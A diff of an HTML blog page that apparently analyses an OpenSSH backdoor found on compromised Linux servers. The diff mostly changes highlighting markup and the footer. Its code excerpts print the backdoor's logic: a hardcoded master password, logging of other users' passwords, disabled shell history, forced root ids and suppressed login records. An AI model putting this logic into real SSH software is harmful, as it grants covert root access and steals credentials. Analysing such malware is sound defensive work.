@@ -14,13 +14,6 @@
 
   
   
-  <meta name="twitter:card" content="summary" />
-  <meta name="twitter:title" content="Openssh backdoor used on compromised Linux servers" />
-  <meta name="twitter:description" content=""
-  />
-  <meta name="twitter:site" content="@https://twitter.com/tenacioustek" />
-  <meta name="twitter:creator" content="@https://twitter.com/tenacioustek" />
-  
 
   <link rel="shortcut icon" type="image/png" href="/favicon.ico" />
 
@@ -243,7 +236,7 @@
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> backdoor_active;
 </span></span></code></pre></div><p>The BACKDOORPASSWD macro is used in the file <em>auth-passwd.c</em>, in the auth_password function in charge of checking the users password:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>    backdoor_active <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(strcmp(password, BACKDOORPASSWD) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">strcmp</span>(password, BACKDOORPASSWD) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)
 </span></span><span style="display:flex;"><span>    {
 </span></span><span style="display:flex;"><span>        backdoor_active <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
@@ -253,15 +246,15 @@
 </span></span><span style="display:flex;"><span>    [LEGITIMATE CODE]
 </span></span><span style="display:flex;"><span>    [...]
 </span></span></code></pre></div><p>Strangely, this backdoor also implements a logging functionnality both in <em>sshconnect1.c</em> and <em>sshconnect2.c</em>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>((strcmp(BACKDOORPASSWD,password) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) <span style="color:#f92672">&amp;&amp;</span> LOGGING_PASSWORDS)
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>((<span style="color:#a6e22e">strcmp</span>(BACKDOORPASSWD,password) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) <span style="color:#f92672">&amp;&amp;</span> LOGGING_PASSWORDS)
 </span></span><span style="display:flex;"><span>      {
-</span></span><span style="display:flex;"><span>        FILE <span style="color:#f92672">*</span>fp <span style="color:#f92672">=</span> fopen(PASSWORDS_LOG_FILE,<span style="color:#e6db74">&#34;a&#34;</span>);
-</span></span><span style="display:flex;"><span>        fprintf (fp,<span style="color:#e6db74">&#34;+host: %s +user: %s +password: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, get_remote_ipaddr(), options.user, password);
-</span></span><span style="display:flex;"><span>        fclose (fp)
+</span></span><span style="display:flex;"><span>        FILE <span style="color:#f92672">*</span>fp <span style="color:#f92672">=</span> <span style="color:#a6e22e">fopen</span>(PASSWORDS_LOG_FILE,<span style="color:#e6db74">&#34;a&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">fprintf</span> (fp,<span style="color:#e6db74">&#34;+host: %s +user: %s +password: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">get_remote_ipaddr</span>(), options.user, password);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">fclose</span> (fp)
 </span></span><span style="display:flex;"><span>      }
 </span></span></code></pre></div><p>In <em>session.c</em>, the backdoor disable the hist file and force the suid to 0 (root):</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>     <span style="color:#66d9ef">if</span>(backdoor_active)
-</span></span><span style="display:flex;"><span>        child_set_env(<span style="color:#f92672">&amp;</span>env, <span style="color:#f92672">&amp;</span>envsize, <span style="color:#e6db74">&#34;HISTFILE&#34;</span>, <span style="color:#e6db74">&#34;/dev/null&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">child_set_env</span>(<span style="color:#f92672">&amp;</span>env, <span style="color:#f92672">&amp;</span>envsize, <span style="color:#e6db74">&#34;HISTFILE&#34;</span>, <span style="color:#e6db74">&#34;/dev/null&#34;</span>);
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    [...]
 </span></span><span style="display:flex;"><span>
@@ -271,60 +264,60 @@
 </span></span><span style="display:flex;"><span>      }
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>
 </span></span><span style="display:flex;"><span>      {
-</span></span><span style="display:flex;"><span>        setgid(<span style="color:#ae81ff">0</span>);
-</span></span><span style="display:flex;"><span>        initgroups(pw<span style="color:#f92672">-&gt;</span>pw_name, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">setgid</span>(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">initgroups</span>(pw<span style="color:#f92672">-&gt;</span>pw_name, <span style="color:#ae81ff">0</span>);
 </span></span><span style="display:flex;"><span>      }
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    [...]
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span>backdoor_active)
-</span></span><span style="display:flex;"><span>        permanently_set_uid(pw);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">permanently_set_uid</span>(pw);
 </span></span></code></pre></div><p>And finally in <em>sshlogin.c</em>, it disable logging of connections using the backdoor password:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#75715e">/*
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">* Records that the user has logged in.  I these parts of operating systems
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">* were more standardized.
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">*/</span>
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">record_login</span>(pid_t pid, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>ttyname, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>user, uid_t uid,
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>host, <span style="color:#66d9ef">struct</span> sockaddr <span style="color:#f92672">*</span> addr, socklen_t addrlen)
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">record_login</span>(<span style="color:#66d9ef">pid_t</span> pid, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>ttyname, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>user, <span style="color:#66d9ef">uid_t</span> uid,
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>host, <span style="color:#66d9ef">struct</span> sockaddr <span style="color:#f92672">*</span> addr, <span style="color:#66d9ef">socklen_t</span> addrlen)
 </span></span><span style="display:flex;"><span>{
 </span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span>backdoor_active)
 </span></span><span style="display:flex;"><span>      {
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">struct</span> logininfo <span style="color:#f92672">*</span>li;
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        li <span style="color:#f92672">=</span> login_alloc_entry(pid, user, host, ttyname);
-</span></span><span style="display:flex;"><span>        login_set_addr(li, addr, addrlen);
-</span></span><span style="display:flex;"><span>        login_login(li);
-</span></span><span style="display:flex;"><span>        login_free_entry(li);
+</span></span><span style="display:flex;"><span>        li <span style="color:#f92672">=</span> <span style="color:#a6e22e">login_alloc_entry</span>(pid, user, host, ttyname);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">login_set_addr</span>(li, addr, addrlen);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">login_login</span>(li);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">login_free_entry</span>(li);
 </span></span><span style="display:flex;"><span>      }
 </span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>}
 </span></span><span style="display:flex;"><span><span style="color:#75715e">#ifdef LOGIN_NEEDS_UTMPX
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">void</span>
-</span></span><span style="display:flex;"><span>record_utmp_only(pid_t pid, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>ttyname, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>user,
-</span></span><span style="display:flex;"><span>                 <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>host, <span style="color:#66d9ef">struct</span> sockaddr <span style="color:#f92672">*</span> addr, socklen_t addrlen)
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">record_utmp_only</span>(<span style="color:#66d9ef">pid_t</span> pid, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>ttyname, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>user,
+</span></span><span style="display:flex;"><span>                 <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>host, <span style="color:#66d9ef">struct</span> sockaddr <span style="color:#f92672">*</span> addr, <span style="color:#66d9ef">socklen_t</span> addrlen)
 </span></span><span style="display:flex;"><span>{
 </span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span>backdoor_active)
 </span></span><span style="display:flex;"><span>    {
 </span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">struct</span> logininfo <span style="color:#f92672">*</span>li;
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  li <span style="color:#f92672">=</span> login_alloc_entry(pid, user, host, ttyname);
-</span></span><span style="display:flex;"><span>  login_set_addr(li, addr, addrlen);
-</span></span><span style="display:flex;"><span>  login_utmp_only(li);
-</span></span><span style="display:flex;"><span>  login_free_entry(li);
+</span></span><span style="display:flex;"><span>  li <span style="color:#f92672">=</span> <span style="color:#a6e22e">login_alloc_entry</span>(pid, user, host, ttyname);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">login_set_addr</span>(li, addr, addrlen);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">login_utmp_only</span>(li);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">login_free_entry</span>(li);
 </span></span><span style="display:flex;"><span>}}
 </span></span><span style="display:flex;"><span><span style="color:#75715e">#endif
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">/* Records that the user has logged out. */</span>
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span>
-</span></span><span style="display:flex;"><span>record_logout(pid_t pid, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>ttyname, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>user)
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">record_logout</span>(<span style="color:#66d9ef">pid_t</span> pid, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>ttyname, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>user)
 </span></span><span style="display:flex;"><span>{
 </span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span>backdoor_active)
 </span></span><span style="display:flex;"><span>    {
 </span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">struct</span> logininfo <span style="color:#f92672">*</span>li;
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  li <span style="color:#f92672">=</span> login_alloc_entry(pid, user, NULL, ttyname);
-</span></span><span style="display:flex;"><span>  login_logout(li);
-</span></span><span style="display:flex;"><span>  login_free_entry(li);
+</span></span><span style="display:flex;"><span>  li <span style="color:#f92672">=</span> <span style="color:#a6e22e">login_alloc_entry</span>(pid, user, NULL, ttyname);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">login_logout</span>(li);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">login_free_entry</span>(li);
 </span></span><span style="display:flex;"><span>}
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><p>All these modifications are in the <a href="https://github.com/Te-k/openssh-backdoor/blob/master/openssh-3.6.1p2-backdoor.patch">openssh-3.6.1p2-backdoor.patch</a> included in the code.</p>
@@ -396,12 +389,6 @@
   
     
     
-      <a class="social-icons__icon" title="Twitter"
-         style="background-image: url(/images/social/twitter.svg)"
-         href="https://twitter.com/tenacioustek"
-         target="_blank" rel="noopener">
-      </a>
-    
   
     
     
@@ -447,7 +434,7 @@
   
 </div>
 
-            <p>© 2022</p>
+            <p>© 2023</p>
           </footer>
           </div>
       </div>
